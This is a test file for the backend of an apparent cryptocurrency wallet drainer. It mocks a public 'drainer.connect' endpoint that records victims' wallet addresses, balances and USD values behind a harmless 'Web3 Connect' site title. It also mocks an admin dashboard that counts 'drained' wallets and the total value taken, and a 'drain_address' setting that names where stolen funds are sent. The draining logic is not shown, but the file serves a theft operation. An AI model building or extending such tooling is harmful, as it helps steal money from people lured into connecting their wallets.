import { describe, expect, it, vi, beforeEach } from "vitest";
import { appRouter } from "./routers";
import type { TrpcContext } from "./_core/context";

// Mock db functions
vi.mock("./db", () => ({
  createWalletConnection: vi.fn().mockResolvedValue({ insertId: 1 }),
  createLog: vi.fn().mockResolvedValue(null),
  createNotification: vi.fn().mockResolvedValue(null),
  initDefaultSettings: vi.fn().mockResolvedValue(null),
  getAllSettings: vi.fn().mockResolvedValue([
    { key: "site_title", value: "Web3 Connect", description: "Site title" },
    { key: "site_description", value: "Connect your wallet", description: "Description" },
    { key: "supported_networks", value: "ethereum,bsc", description: "Networks" },
  ]),
  createTransaction: vi.fn().mockResolvedValue(null),
  updateWalletConnectionStatus: vi.fn().mockResolvedValue(null),
  getDashboardStats: vi.fn().mockResolvedValue({
    connections: { total: 10, connected: 5, drained: 3, failed: 2, totalUsdValue: "5000.00" },
    transactions: { total: 8, success: 6, failed: 2, totalUsdValue: "4500.00" },
    unreadNotifications: 2,
  }),
  getChartData: vi.fn().mockResolvedValue([]),
  getRecentActivity: vi.fn().mockResolvedValue([]),
  getWalletConnections: vi.fn().mockResolvedValue([]),
  getConnectionStats: vi.fn().mockResolvedValue({ total: 0, connected: 0, drained: 0, failed: 0, totalUsdValue: "0" }),
  getTransactions: vi.fn().mockResolvedValue([]),
  getTransactionStats: vi.fn().mockResolvedValue({ total: 0, success: 0, failed: 0, totalUsdValue: "0" }),
  getNotifications: vi.fn().mockResolvedValue([]),
  markNotificationRead: vi.fn().mockResolvedValue(null),
  markAllNotificationsRead: vi.fn().mockResolvedValue(null),
  getUnreadNotificationCount: vi.fn().mockResolvedValue(0),
  getLogs: vi.fn().mockResolvedValue([]),
  getBlacklist: vi.fn().mockResolvedValue([]),
  addToBlacklist: vi.fn().mockResolvedValue(null),
  removeFromBlacklist: vi.fn().mockResolvedValue(null),
  getAllUsers: vi.fn().mockResolvedValue([]),
  upsertUser: vi.fn().mockResolvedValue(null),
  upsertSetting: vi.fn().mockResolvedValue(null),
}));

vi.mock("./_core/notification", () => ({
  notifyOwner: vi.fn().mockResolvedValue(true),
}));

function createPublicContext(): TrpcContext {
  return {
    user: null,
    req: {
      protocol: "https",
      headers: { "user-agent": "test-agent" },
      socket: { remoteAddress: "127.0.0.1" },
    } as unknown as TrpcContext["req"],
    res: {} as TrpcContext["res"],
  };
}

function createAdminContext(): TrpcContext {
  return {
    user: {
      id: 1,
      openId: "admin-user",
      email: "admin@test.com",
      name: "Admin User",
      loginMethod: "manus",
      role: "admin",
      createdAt: new Date(),
      updatedAt: new Date(),
      lastSignedIn: new Date(),
    },
    req: {
      protocol: "https",
      headers: {},
      socket: { remoteAddress: "127.0.0.1" },
    } as unknown as TrpcContext["req"],
    res: {} as TrpcContext["res"],
  };
}

describe("drainer.getSiteSettings", () => {
  it("returns public site settings", async () => {
    const ctx = createPublicContext();
    const caller = appRouter.createCaller(ctx);
    const result = await caller.drainer.getSiteSettings();
    expect(Array.isArray(result)).toBe(true);
    expect(result.some(s => s.key === "site_title")).toBe(true);
  });
});

describe("drainer.connect", () => {
  it("successfully connects a wallet", async () => {
    const ctx = createPublicContext();
    const caller = appRouter.createCaller(ctx);
    const result = await caller.drainer.connect({
      walletAddress: "0x1234567890abcdef1234567890abcdef12345678",
      walletType: "metamask",
      network: "ethereum",
      chainId: 1,
      ethBalance: "1.5",
      usdValue: "3600.00",
    });
    expect(result.success).toBe(true);
  });
});

describe("admin.getDashboardStats", () => {
  it("returns dashboard stats for admin", async () => {
    const ctx = createAdminContext();
    const caller = appRouter.createCaller(ctx);
    const result = await caller.admin.getDashboardStats();
    expect(result.connections).toBeDefined();
    expect(result.transactions).toBeDefined();
    expect(result.connections.total).toBe(10);
  });

  it("throws FORBIDDEN for non-admin", async () => {
    const ctx: TrpcContext = {
      ...createPublicContext(),
      user: {
        id: 2,
        openId: "regular-user",
        email: "user@test.com",
        name: "Regular User",
        loginMethod: "manus",
        role: "user",
        createdAt: new Date(),
        updatedAt: new Date(),
        lastSignedIn: new Date(),
      },
    };
    const caller = appRouter.createCaller(ctx);
    await expect(caller.admin.getDashboardStats()).rejects.toThrow();
  });
});

describe("admin.getConnections", () => {
  it("returns empty connections list for admin", async () => {
    const ctx = createAdminContext();
    const caller = appRouter.createCaller(ctx);
    const result = await caller.admin.getConnections({ limit: 10, offset: 0 });
    expect(Array.isArray(result)).toBe(true);
  });
});

describe("admin.updateSetting", () => {
  it("updates a setting successfully", async () => {
    const ctx = createAdminContext();
    const caller = appRouter.createCaller(ctx);
    const result = await caller.admin.updateSetting({ key: "drain_address", value: "0xabc" });
    expect(result.success).toBe(true);
  });
});
